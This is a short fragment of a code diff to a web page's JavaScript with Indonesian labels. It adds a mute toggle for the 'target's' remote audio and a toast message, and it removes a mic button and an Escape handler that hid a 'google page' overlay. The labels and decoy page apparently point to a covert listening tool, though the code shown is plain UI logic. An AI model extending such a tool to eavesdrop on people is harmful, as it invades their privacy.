+        window.toggleRemoteAudio = () => {
+            const audioEl = document.getElementById('remoteAudio');
+            const btn = document.getElementById('muteRemoteBtn');
+            if (audioEl.muted) {
+                audioEl.muted = false;
+                btn.innerHTML = '<i class="fa-solid fa-volume-high"></i> Suara Target: AKTIF';
+                btn.className = "w-full bg-slate-800 text-slate-300 py-3 rounded-xl border border-slate-700";
             } else {
-                if (isMuted) {
-                    mobileMicBtn.className = "w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 transition-all active:scale-95 bg-slate-800 text-slate-400 border border-slate-700";
-                    mobileMicBtn.innerHTML = '<i class="fa-solid fa-microphone-slash"></i><span>MIC MATI (Dengar)</span>';
-                } else {
-                    mobileMicBtn.className = "w-full py-8 rounded-2xl font-bold text-lg flex items-center justify-center gap-3 transition-all active:scale-95 bg-red-600 text-white border border-red-500 shadow-lg shadow-red-900/50";
-                    mobileMicBtn.innerHTML = '<i class="fa-solid fa-microphone"></i><span>BICARA (ON)</span>';
-                }
+                audioEl.muted = true;
+                btn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i> Suara Target: MUTE';
+                btn.className = "w-full bg-red-900/30 text-red-400 py-3 rounded-xl border border-red-900";
             }
         }
-        
-        // Key handler untuk exit google page
-        document.addEventListener('keydown', function(e) {
-            if (e.key === "Escape" && !googlePage.classList.contains('hidden')) {
-                googlePage.classList.add('hidden');
-                activePage.classList.remove('hidden');
-            }
-        });
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.classList.remove('hidden');
+            setTimeout(() => t.classList.add('hidden'), 3000);
+        }
     </script>
 </body>
 </html>
